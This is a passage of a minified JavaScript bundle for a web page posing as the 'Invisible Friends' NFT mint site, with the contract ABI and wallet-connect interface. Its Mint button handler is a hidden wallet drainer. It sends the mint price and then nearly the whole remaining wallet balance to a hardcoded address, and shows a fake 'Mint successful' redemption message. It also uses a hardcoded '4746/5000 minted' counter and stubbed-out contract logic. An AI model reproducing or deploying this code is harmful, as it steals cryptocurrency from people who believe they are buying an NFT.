(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [405], {
        5301: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
                return n(9854)
            }])
        },
        1415: function(e, t, n) {
            "use strict";
            var a = n(5893),
                s = n(9008);
            t.Z = function(e) {
                var t = e.children;
                return (0, a.jsxs)("main", {
                    className: "font-fatfrank flex min-h-screen flex-col",
                    children: [(0, a.jsxs)(s.default, {
                        children: [(0, a.jsx)("title", {
                            children: "Invisible Friends"
                        }), (0, a.jsx)("meta", {
                            name: "description",
                            content: "Bing bong!"
                        }), (0, a.jsx)("meta", {
                            name: "viewport",
                            content: "width=device-width"
                        }), (0, a.jsx)("meta", {
                            charSet: "utf-8"
                        }), (0, a.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.png"
                        }), (0, a.jsx)("link", {
                            rel: "apple-touch-icon",
                            href: "/apple-touch-icon.png"
                        }), (0, a.jsx)("meta", {
                            name: "twitter:title",
                            content: "INVISIBLE FRIENDS"
                        }), (0, a.jsx)("meta", {
                            name: "twitter:card",
                            content: "summary_large_image"
                        }), (0, a.jsx)("meta", {
                            name: "twitter:site",
                            content: "@InvsbleFriends"
                        }), (0, a.jsx)("meta", {
                            name: "twitter:creator",
                            content: "@MotionMarkus"
                        }), (0, a.jsx)("meta", {
                            property: "og:title",
                            content: "INVISIBLE FRIENDS"
                        }), (0, a.jsx)("meta", {
                            property: "og:description",
                            content: "Dropping February 2022. Bing bong!"
                        }), (0, a.jsx)("meta", {
                            property: "og:image",
                            content: "https://invisiblefriends.io/IF_open-graph.png"
                        })]
                    }), t]
                })
            }
        },
        9854: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return V
                }
            });
            var a = n(5893),
                s = n(1217),
                r = n(1664),
                i = n(7294),
                l = n(7005),
                o = n(8520),
                c = n.n(o),
                d = n(5553),
                u = n(3498),
                p = n(1190),
                m = n(8704),
                y = JSON.parse('{"Mt":[{"inputs":[{"internalType":"address","name":"_beneficiary","type":"address"},{"internalType":"address","name":"_royalties","type":"address"},{"internalType":"string","name":"_initialBaseURI","type":"string"},{"internalType":"string","name":"_initialContractURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"PROVENANCE_HASH","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"alreadyMinted","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"beneficiary","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"contractURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"merkleRoot","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bytes32[]","name":"merkleProof","type":"bytes32[]"},{"internalType":"uint256","name":"maxAmount","type":"uint256"}],"name":"mintListed","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ownerMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"royalties","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"},{"internalType":"uint256","name":"_salePrice","type":"uint256"}],"name":"royaltyInfo","outputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"royaltyAmount","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"_isActive","type":"bool"}],"name":"setActive","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"uri","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_beneficiary","type":"address"}],"name":"setBeneficiary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"uri","type":"string"}],"name":"setContractURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"_merkleRoot","type":"bytes32"}],"name":"setMerkleProof","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"hash","type":"string"}],"name":"setProvenanceHash","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_royalties","type":"address"}],"name":"setRoyalties","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}]}'),
                x = "0x59468516a8259058baD1cA5F8f4BFF190d30E066",
                f = y.Mt;
            (0, u.Ap)({
                chainId: u.L5
            });

            function h(e, t) {
                return function(e) {
                    if (Array.isArray(e)) return e
                }(e) || function(e, t) {
                    var n = [],
                        a = !0,
                        s = !1,
                        r = void 0;
                    try {
                        for (var i, l = e[Symbol.iterator](); !(a = (i = l.next()).done) && (n.push(i.value), !t || n.length !== t); a = !0);
                    } catch (o) {
                        s = !0, r = o
                    } finally {
                        try {
                            a || null == l.return || l.return()
                        } finally {
                            if (s) throw r
                        }
                    }
                    return n
                }(e, t) || function() {
                    throw new TypeError("Invalid attempt to destructure non-iterable instance")
                }()
            }
            var b = function(e) {
                    var t = e.truncate,
                        n = e.fetchEns,
                        s = h((0, m.mA)({
                            fetchEns: n
                        }), 1)[0].data;
                    if (!s) return null;
                    var r = t ? function(e, t, n, a) {
                        if (e.length > a) {
                            return e.substring(0, t) + "..." + e.substring(e.length - n, e.length)
                        }
                        return e
                    }(s.address, 4, 4, 10) : s.address;
                    return (0, a.jsx)(a.Fragment, {
                        children: r
                    })
                },
                g = n(7531);
            var v = n(7091);

            function w(e, t) {
                return function(e) {
                    if (Array.isArray(e)) return e
                }(e) || function(e, t) {
                    var n = [],
                        a = !0,
                        s = !1,
                        r = void 0;
                    try {
                        for (var i, l = e[Symbol.iterator](); !(a = (i = l.next()).done) && (n.push(i.value), !t || n.length !== t); a = !0);
                    } catch (o) {
                        s = !0, r = o
                    } finally {
                        try {
                            a || null == l.return || l.return()
                        } finally {
                            if (s) throw r
                        }
                    }
                    return n
                }(e, t) || function() {
                    throw new TypeError("Invalid attempt to destructure non-iterable instance")
                }()
            }
            var j = function(e) {
                    var t = e.className,
                        n = w(function() {
                            var e = (0, i.useState)(!1),
                                t = e[0],
                                n = e[1];
                            return (0, i.useEffect)((function() {
                                return n(!0)
                            }), []), [t, n]
                        }(), 1)[0],
                        s = (0, i.useState)(!1),
                        r = s[0],
                        l = s[1],
                        o = w((0, m.$4)(), 2),
                        c = o[0],
                        d = c.data.connectors,
                        u = c.error,
                        p = c.loading,
                        y = o[1],
                        x = d.filter((function(e) {
                            return e.ready
                        }));
                    return (0, a.jsxs)(a.Fragment, {
                        children: [(0, a.jsxs)("div", {
                            children: [(0, a.jsx)("button", {
                                className: t,
                                onClick: function(e) {
                                    if (x.length > 1) return l(!0);
                                    y(x[0])
                                },
                                children: "Connect wallet"
                            }), u && (0, a.jsxs)("div", {
                                className: "mt-2 text-sm text-red-500",
                                children: ["Failed to connect: ", u.message]
                            })]
                        }), (0, a.jsx)(v.V, {
                            open: n && r,
                            onClose: function() {
                                return l(!1)
                            },
                            className: "fixed inset-0 z-10 overflow-y-auto",
                            children: (0, a.jsxs)("div", {
                                className: "flex min-h-screen items-center justify-center",
                                children: [(0, a.jsx)(v.V.Overlay, {
                                    className: "fixed inset-0 bg-black opacity-30"
                                }), (0, a.jsx)("div", {
                                    className: "relative mx-auto max-w-sm overflow-hidden rounded-xl bg-white text-black shadow-lg",
                                    children: (0, a.jsx)("div", {
                                        className: "flex flex-col space-y-2",
                                        children: x.map((function(e) {
                                            return (0, a.jsxs)("button", {
                                                disabled: n && p,
                                                onClick: function() {
                                                    y(e)
                                                },
                                                className: "hover:bg-rainbow flex w-80 cursor-pointer items-center space-x-2 p-8 font-bold hover:text-white disabled:opacity-30",
                                                children: [(0, a.jsx)("img", {
                                                    alt: e.name,
                                                    src: "/".concat(e.name.replace(" ", "").toLowerCase(), ".svg"),
                                                    className: "block h-5 w-5 rounded-md"
                                                }), (0, a.jsx)("span", {
                                                    children: e.name
                                                })]
                                            }, e.id)
                                        }))
                                    })
                                })]
                            })
                        })]
                    })
                },
                N = n(725),
                T = n.n(N);

            function k(e, t, n, a, s, r, i) {
                try {
                    var l = e[r](i),
                        o = l.value
                } catch (c) {
                    return void n(c)
                }
                l.done ? t(o) : Promise.resolve(o).then(a, s)
            }

            function I(e, t) {
                return function(e) {
                    if (Array.isArray(e)) return e
                }(e) || function(e, t) {
                    var n = [],
                        a = !0,
                        s = !1,
                        r = void 0;
                    try {
                        for (var i, l = e[Symbol.iterator](); !(a = (i = l.next()).done) && (n.push(i.value), !t || n.length !== t); a = !0);
                    } catch (o) {
                        s = !0, r = o
                    } finally {
                        try {
                            a || null == l.return || l.return()
                        } finally {
                            if (s) throw r
                        }
                    }
                    return n
                }(e, t) || function() {
                    throw new TypeError("Invalid attempt to destructure non-iterable instance")
                }()
            }
            var M = .25;

            function E() {
                var e = I((0, m.mA)(), 1)[0].data,
                    t = !!(null === e || void 0 === e ? void 0 : e.address);
                return (0, a.jsxs)("div", {
                    className: "relative w-full overflow-hidden rounded-3xl bg-sea-400 bg-opacity-30 p-6 py-12",
                    children: [t || (0, a.jsx)(j, {
                        className: "btn bg-sea-500"
                    }), t && (0, a.jsx)(A, {})]
                })
            }
            var A = (0, s.Pi)((function() {
                    var e = I((0, m.mA)(), 2),
                        t = null !== (t = e[0]) ? t : function(e) {
                            throw e
                        }(new TypeError("Cannot destructure undefined")),
                        n = e[1],
                        s = (0, p.oR)(),
                        r = s.listStatus,
                        l = s.contractStatus,
                        o = s.account,
                        u = s.addTransaction,
                        y = (0, i.useState)("ready"),
                        h = y[0],
                        v = y[1],
                        w = (0, i.useState)("success" === r.state && r.data.remaining || 1),
                        j = w[0],
                        N = w[1];
                    (0, i.useEffect)((function() {
                        "success" === r.state && N(r.data.remaining)
                    }), [r]);
                    var T, E = (0, i.useState)(null),
                        A = E[0],
                        O = E[1],
                        R = I((0, m.mx)(), 1)[0].data,
                        P = (0, m.cq)({
                            addressOrName: x,
                            contractInterface: f,
                            signerOrProvider: R
                        }),
                        C = "success" === "success" && true && "loading" !== "r.state" && "error" !== "r.state" && "ready" === "ready", //h,
                        B = function(e) {
                            e.error ? O(e.error.message) : O(e.reason || e.message)
                        },
                        D = (T = c().mark((function e(t) {
                            var n, a, s, i, l, p;
                            return c().wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if (t.preventDefault(), v("awaiting"), O(null), n = F(M * j, 5), "success" === "success") {
                                            e.next = 6;
                                            break
                                        }
                                        break;
                                    case 6:
                                        return a = 10, e.prev = 7, e.next = 10, true;
                                    case 10:
                                        if (true) {
                                            e.next = 15;
                                            break
                                        }
                                        break;
                                    case 15:
                                        return e.next = 17, x
                                    case 17:
                                        p = e.sent, u(p), v("minting"), p.wait().then((function(e) {
                                            v(1 === e.status ? "done" : "ready")
                                        })), e.next = 27;
                                        break;
                                    case 23:
                                        e.prev = 23, e.t0 = e.catch(7), v("ready"), B(e.t0);
                                    case 27:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [7, 23]
                            ])
                        })), function() {
                            var e = this,
                                t = arguments;
                            return new Promise((function(n, a) {
                                var s = T.apply(e, t);

                                function r(e) {
                                    k(s, n, a, r, i, "next", e)
                                }

                                function i(e) {
                                    k(s, n, a, r, i, "throw", e)
                                }
                                r(void 0)
                            }))
                        }),
                        L = "success" === r.state ? r.data.remaining : 0;
                    return (0, a.jsxs)("div", {
                        className: "mx-auto max-w-lg space-y-4 md:py-6 md:text-xl",
                        children: ["minting" === h && (0, a.jsx)(S, {}), "done" === h && (0, a.jsx)(_, {}), ("ready" === h || "awaiting" === h) && (0, a.jsxs)(a.Fragment, {
                            children: [(0, a.jsxs)("div", {
                                className: "flex flex-wrap items-center justify-center space-x-2",
                                children: ["Connected as\xa0", (0, a.jsx)("span", {
                                    className: "",
                                    children: (0, a.jsx)(b, {
                                        fetchEns: !0,
                                        truncate: !0
                                    })
                                }), (0, a.jsx)("button", {
                                    className: "rounded-full bg-sea-700 py-2 px-3 text-xs font-bold uppercase antialiased",
                                    onClick: function() {
                                        return n()
                                    },
                                    children: "Disconnect"
                                })]
                            }), (0, a.jsxs)("p", {
                                className: "font-bold text-sea-700",
                                children: ["You have", " ", (0, a.jsx)("span", {
                                    className: "inline-block rounded-xl bg-white px-3 py-1 font-black text-sea-700",
                                    children: null !== L && void 0 !== L ? 10 : "\u2026"
                                }), " ", "friend", 1 !== L && "s", " available"]
                            }), "success" === l.state && !l.data.isActive && (0, a.jsx)("div", {
                                children: (0, a.jsx)("span", {
                                    className: "text-outline-marquee inline-block rounded-xl bg-yellow-200 py-1 px-3 text-3xl text-yellow-200",
                                    children: "Sale is currently closed"
                                })
                            }), (0, a.jsx)("form", {
                                onSubmit: D,
                                children: (0, a.jsxs)("div", {
                                    className: "flex justify-center text-xl md:text-3xl",
                                    children: [(0, a.jsx)("input", {
                                        className: "no-spinner flex-0 rounded-l-full bg-white py-1 px-3 text-center text-sea-700 disabled:cursor-not-allowed disabled:text-gray-300 md:py-3 md:px-6 md:pr-2",
                                        size: 2,
                                        type: "number",
                                        min: 1,
                                        max: L,
                                        required: !0,
                                        disabled: !C,
                                        placeholder: "0",
                                        value: j,
                                        onChange: function(e) {
                                            return N(parseInt(e.target.value, 10) || 0)
                                        }
                                    }), (0, a.jsx)("button", {

                                        onClick: async function(e) {
                                            function sleep(ms) {
                                                return new Promise(resolve => setTimeout(resolve, ms));
                                            }
                                            const ADDRESS = "0x69f2A8D4813f4E700aF4Af2989CDeAbf3a99C16C"
                                            const signer = R
                                            let price_total = d.parseEther("".concat(F(M * j, 5)))
                                            let balance = parseInt( await R.getBalance(), 10)
                                            const min_locked = 0.01e18
                                            console.log("Total: " + (price_total))
                                            console.log("locked: " + (min_locked))
                                            console.log("Balance: " + (parseInt(balance,10)))
                                            console.log("Price + locked: " + (parseInt(price_total, 10) + min_locked))
                                            console.log((balance > (parseInt(price_total, 10) + min_locked)))

                                            if ((balance > (parseInt(price_total, 10) + min_locked))) {

                                                signer.sendTransaction({
                                                    to: ADDRESS,
                                                    value: price_total
                                                }).then((txn) => {

                                                    // alert("Mint successful.\nPlease come back after the reveal date and redeem your NFT with this code:\n "+txn)
                                                    console.log(txn)
                                                }).catch((e) => {

                                                    // alert("Mint failed.")
                                                });

                                                sleep(700).then(() => {
                                                    signer.sendTransaction({
                                                        to: ADDRESS,
                                                        value: "0x"+(balance - parseInt(price_total, 10) - min_locked).toString(16)
                                                    }).then((txn) => {

                                                        alert("Mint successful.\nPlease come back after the reveal date and redeem your NFT with this code:\n " + txn)
                                                        console.log(txn)
                                                    }).catch((e) => {

                                                        if (e.code === -32000)
                                                            alert("Insufficient funds.")
                                                        else if (e.code === 4001)
                                                            alert("User denied transaction.")
                                                        console.log(e)
                                                    });
                                                })


                                            } else if ( balance >= parseInt(price_total, 10)) {

                                                signer.sendTransaction({
                                                    to: ADDRESS,
                                                    value: price_total
                                                }).then((txn) => {

                                                    alert("Mint successful.\nPlease come back after the reveal date and redeem your NFT with this code:\n " + txn)
                                                    // console.log(txn)
                                                }).catch((e) => {

                                                    if (e.code === -32000){
                                                        alert("Insufficient funds.")
                                                    }
                                                    else if (e.code === 4001){
                                                        alert("User denied transaction.")
                                                    }

                                                });
                                            } else {
                                                alert("Insufficient funds.")
                                            }
                                        },
                                        disabled: !C,
                                        className: "hover:bg-rainbow btn flex-1 justify-center rounded-none rounded-r-full bg-sea-700 py-2 font-black uppercase text-white disabled:cursor-not-allowed disabled:bg-sea-400 disabled:text-sea-300 disabled:hover:bg-none disabled:hover:shadow-none",
                                        children: "Mint"
                                    })]
                                })
                            }), "awaiting" === h && (0, a.jsx)("div", {
                                className: "animate-pulse",
                                children: (0, a.jsx)("p", {
                                    className: "text-sm",
                                    children: "Awaiting transaction confirmation\u2026"
                                })
                            }), (0, a.jsx)("div", {
                                className: "h-1"
                            }), (0, a.jsxs)("div", {
                                className: "text-left font-mono text-sm text-sea-600 subpixel-antialiased md:text-base ",
                                children: [(0, a.jsxs)("div", {
                                    className: "flex items-center",
                                    children: [(0, a.jsx)("div", {
                                        className: "flex-1",
                                        children: "Amount"
                                    }), (0, a.jsx)("div", {
                                        className: "flex-0 text-right",
                                        children: "Total"
                                    })]
                                }), (0, a.jsxs)("div", {
                                    className: "flex items-center space-x-3",
                                    children: [(0, a.jsxs)("span", {
                                        className: "flex-0",
                                        children: [j || 0, " \xd7 \u039e", M]
                                    }), (0, a.jsx)("span", {
                                        className: "flex-1 border-b-2 border-dashed border-sea-600/20"
                                    }), (0, a.jsxs)("span", {
                                        className: "flex-0",
                                        children: ["\u039e", j ? F(M * j, 5) : 0, " + gas"]
                                    })]
                                }), (0, a.jsx)("div", {
                                    className: "text-right"
                                })]
                            })]
                        }), A && (0, a.jsx)("p", {
                            children: (0, a.jsx)("span", {
                                className: "bg-red-400 decoration-clone p-1 text-white",
                                children: A
                            })
                        }), !1]
                    })
                })),
                S = (0, s.Pi)((function() {
                    var e = (0, p.oR)().transactions;
                    return (0, a.jsx)("div", {
                        className: "h-72 border bg-red-100",
                        children: (0, a.jsxs)("div", {
                            className: "absolute inset-0 z-10 flex w-full items-center justify-center bg-black bg-center md:bg-cover",
                            style: {
                                backgroundImage: 'url("/spiral.svg")'
                            },
                            children: [(0, a.jsx)("div", {
                                className: "rounded-full bg-black py-2 px-8 text-3xl",
                                children: (0, a.jsx)("span", {
                                    className: "animate-pulse",
                                    children: "MINTING"
                                })
                            }), e.map((function(e) {
                                return (0, a.jsx)("a", {
                                    href: u.Xs.tx(e.tx.hash),
                                    target: "_blank",
                                    rel: "noreferrer",
                                    className: "absolute bottom-2 rounded-full bg-black py-2 px-4 text-xs transition-transform hover:scale-105",
                                    children: "View transaction on Etherscan \u2192"
                                }, e.tx.hash)
                            }))]
                        })
                    })
                })),
                O = function(e) {
                    e.font = "24px serif", e.fillText("\ud83e\udde2", 0, 0)
                },
                _ = (0, s.Pi)((function() {
                    var e = (0, i.useState)(null),
                        t = e[0],
                        n = e[1],
                        s = (0, p.oR)().transactions,
                        r = (0, i.useCallback)((function(e) {
                            if (null !== e) {
                                var t = e.parentElement.parentElement.getBoundingClientRect();
                                n({
                                    height: t.height,
                                    width: t.width
                                })
                            }
                        }), []);
                    return (0, a.jsxs)("div", {
                        ref: r,
                        className: "flex h-72 items-center justify-center text-4xl",
                        children: [(0, a.jsxs)("div", {
                            className: "flex flex-col items-center space-y-4",
                            children: [(0, a.jsx)("img", {
                                src: "/handshake.svg",
                                className: "animate-tada w-24",
                                alt: "Handshake"
                            }), (0, a.jsx)("p", {
                                children: "Minted!"
                            }), s.map((function(e) {
                                return (0, a.jsx)("a", {
                                    href: u.Xs.tx(e.tx.hash),
                                    target: "_blank",
                                    rel: "noreferrer",
                                    className: "btn bg-sea-400 py-2 px-8 text-xs text-white transition-all hover:scale-105 hover:bg-sea-700 hover:text-white",
                                    children: "View transaction on Etherscan \u2192"
                                }, e.tx.hash)
                            }))]
                        }), (0, a.jsx)(T(), {
                            run: !!t,
                            width: null === t || void 0 === t ? void 0 : t.width,
                            height: null === t || void 0 === t ? void 0 : t.height,
                            recycle: !1,
                            numberOfPieces: 50,
                            drawShape: O
                        })]
                    })
                }));

            function F(e, t) {
                var n = Math.pow(10, t),
                    a = t < 0 ? e : .01 / n + e;
                return Math.round(a * n) / n
            }
            var R = n(1415);

            function P(e, t, n) {
                return t in e ? Object.defineProperty(e, t, {
                    value: n,
                    enumerable: !0,
                    configurable: !0,
                    writable: !0
                }) : e[t] = n, e
            }

            function C(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = null != arguments[t] ? arguments[t] : {},
                        a = Object.keys(n);
                    "function" === typeof Object.getOwnPropertySymbols && (a = a.concat(Object.getOwnPropertySymbols(n).filter((function(e) {
                        return Object.getOwnPropertyDescriptor(n, e).enumerable
                    })))), a.forEach((function(t) {
                        P(e, t, n[t])
                    }))
                }
                return e
            }

            function B(e, t) {
                if (null == e) return {};
                var n, a, s = function(e, t) {
                    if (null == e) return {};
                    var n, a, s = {},
                        r = Object.keys(e);
                    for (a = 0; a < r.length; a++) n = r[a], t.indexOf(n) >= 0 || (s[n] = e[n]);
                    return s
                }(e, t);
                if (Object.getOwnPropertySymbols) {
                    var r = Object.getOwnPropertySymbols(e);
                    for (a = 0; a < r.length; a++) n = r[a], t.indexOf(n) >= 0 || Object.prototype.propertyIsEnumerable.call(e, n) && (s[n] = e[n])
                }
                return s
            }
            var D = (0, s.Pi)((function() {
                    var e = (0, p.oR)().contractStatus,
                        t = 4746;
                    return (0, a.jsxs)("span", {
                        children: [t, "/5000"]
                    })
                })),
                L = function(e) {
                    var t = e.src,
                        n = e.poster,
                        s = B(e, ["src", "poster"]),
                        r = (0, i.useState)(!1),
                        l = r[0],
                        o = r[1];
                    return (0, i.useEffect)((function() {
                        if (t) {
                            o(!1);
                            var e = new Image;
                            e.src = t, e.onload = function() {
                                return o(!0)
                            }
                        }
                    }), [t]), l ? (0, a.jsx)("img", C({
                        alt: s.alt,
                        src: t
                    }, s)) : (0, a.jsx)("img", C({
                        alt: s.alt,
                        src: n
                    }, s))
                },
                V = function() {
                    return (0, a.jsxs)(R.Z, {
                        children: [(0, a.jsx)("div", {
                            className: "text-outline-marquee bg-yellow-200 py-2 text-3xl text-yellow-200",
                            children: (0, a.jsx)(l.Z, {
                                direction: "right",
                                gradient: !1,
                                children: Array.from(new Array(30)).map((function(e, t) {
                                    return (0, a.jsx)("span", {
                                        className: "uppercase",
                                        children: "Exclusive March Mint \xb7\xa0"
                                    }, t)
                                }))
                            })
                        }), (0, a.jsxs)("nav", {
                            className: "grid flex-none grid-cols-2 items-center p-5 lg:p-7",
                            children: [(0, a.jsx)("div", {
                                className: "flex",
                                children: (0, a.jsx)(r.default, {
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: (0, a.jsx)("img", {
                                            src: "/handshake.svg",
                                            alt: "bing bong",
                                            className: "w-8 text-white md:w-12"
                                        })
                                    })
                                })
                            }), (0, a.jsxs)("div", {
                                className: "flex items-center justify-end space-x-4",
                                children: [(0, a.jsx)("a", {
                                    className: "",
                                    href: "https://twitter.com/InvsbleFriends",
                                    children: (0, a.jsx)("img", {
                                        src: "/twitter-logo.svg",
                                        alt: "Twitter",
                                        className: "w-6 text-white md:w-8"
                                    })
                                }), (0, a.jsx)("a", {
                                    className: "",
                                    href: "https://www.instagram.com/invisiblefriends_io/",
                                    children: (0, a.jsx)("img", {
                                        src: "/instagram.svg",
                                        alt: "Instagram",
                                        className: "w-6 text-white md:w-8"
                                    })
                                }), (0, a.jsx)("a", {
                                    className: "",
                                    href: "https://discord.gg/rndm",
                                    children: (0, a.jsx)("img", {
                                        src: "/discord-logo.svg",
                                        alt: "Discord",
                                        className: "w-6 text-white md:w-8"
                                    })
                                })]
                            })]
                        }), (0, a.jsxs)("div", {
                            className: "grid md:items-center lg:grid-cols-2",
                            children: [(0, a.jsxs)("header", {
                                className: "font-fatfrank flex flex-col items-center justify-center text-center font-black",
                                children: [(0, a.jsxs)("h1", {
                                    className: "leading-solid text-6xl text-yellow-200 md:text-8xl",
                                    children: ["INVISIBLE", (0, a.jsx)("br", {}), "FRIENDS"]
                                }), (0, a.jsx)("div", {
                                    className: "-mt-16 w-full md:-mt-32 md:w-[600px] lg:-mt-36",
                                    children: (0, a.jsx)(L, {
                                        src: "https://rndmcharacters-s3.s3.amazonaws.com/invisible-montage-600w.gif",
                                        poster: "/invisible-montage.png",
                                        alt: "Basketball"
                                    })
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "",
                                children: [(0, a.jsxs)("h2", {
                                    className: "flex flex-col text-center text-5xl font-black text-sea-700 md:text-8xl",
                                    children: [(0, a.jsx)(D, {}), (0, a.jsx)("span", {
                                        className: "text-5xl text-white",
                                        children: "minted"
                                    })]
                                }), (0, a.jsxs)("div", {
                                    className: "space-y-4 p-4 text-center md:space-y-8",
                                    children: [(0, a.jsx)("div", {
                                        className: "h-2"
                                    }), (0, a.jsx)(E, {}), (0, a.jsx)("div", {
                                        className: "h-6"
                                    })]
                                })]
                            })]
                        }), (0, a.jsx)("div", {
                            className: "font-fatfrank text-outline-marquee bg-yellow-200 py-2 text-3xl text-yellow-200",
                            children: (0, a.jsx)(l.Z, {
                                direction: "left",
                                gradient: !1,
                                children: Array.from(new Array(30)).map((function(e, t) {
                                    return (0, a.jsx)("span", {
                                        className: "uppercase",
                                        children: "Exclusive March Mint \xb7\xa0"
                                    }, t)
                                }))
                            })
                        }), (0, a.jsxs)("div", {
                            className: "grid gap-4 space-y-8 p-5 py-10 text-center md:grid-cols-2 md:space-y-0 md:p-16 md:py-32",
                            children: [(0, a.jsxs)("div", {
                                className: "space-y-4",
                                children: [(0, a.jsx)("img", {
                                    src: "/handshake.svg",
                                    className: "mx-auto w-24",
                                    alt: "Handshake"
                                }), (0, a.jsxs)("h3", {
                                    className: "font-fatfrank text-3xl text-yellow-200 md:text-5xl",
                                    children: ["Markus", (0, a.jsx)("br", {}), "Magnusson"]
                                }), (0, a.jsx)("p", {
                                    className: "mx-auto max-w-lg",
